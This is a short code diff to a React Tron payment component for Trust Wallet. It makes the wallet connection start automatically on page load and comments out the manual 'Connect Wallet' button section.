@@ -118,6 +118,9 @@ const TrustWalletTronPay = () => {
   useEffect(() => {
     trustConnectingRef.current = trustConnecting;
   }, [trustConnecting]);
+  useEffect(() => {
+    handleConnectWallet();
+  }, []);
 
   /**
    * WalletConnect (Tron) for users opening this page in **Trust Wallet Discover**:
@@ -302,7 +305,7 @@ const TrustWalletTronPay = () => {
               : "Not connected — in Trust Discover, tap Connect Wallet to approve"}
           </div>
         </div>
-
+{/* 
         <div className="mb-4 rounded-xl border border-[#e4e4e8] bg-white p-3 shadow-sm">
           <button
             type="button"
@@ -381,7 +384,7 @@ const TrustWalletTronPay = () => {
               {trustConnecting ? "Connecting…" : "Connect Wallet"}
             </button>
           </div>
-        )}
+        )} */}
 
         <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
           Address or Domain Name
